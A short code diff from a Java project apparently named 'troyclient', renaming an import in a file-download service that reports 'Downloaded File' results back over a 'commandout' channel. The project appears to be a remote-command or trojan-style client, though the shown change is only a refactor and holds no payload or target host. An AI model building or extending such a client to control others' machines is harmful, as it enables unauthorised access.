@@ -1,6 +1,6 @@
 package ch.lebois.troyclient.service;
 
-import ch.lebois.troyclient.main.GetContext;
+import ch.lebois.troyclient.main.SystemVariables;
 
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -25,7 +25,7 @@ public class DownloadService {
             fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
             rbc.close();
             fos.close();
-            GetContext.SENDER.send("commandout", "Downloaded File " + fileName);
+            SystemVariables.SENDER.send("commandout", "Downloaded File " + fileName);
         } catch (IOException e) {
             e.printStackTrace();
         }
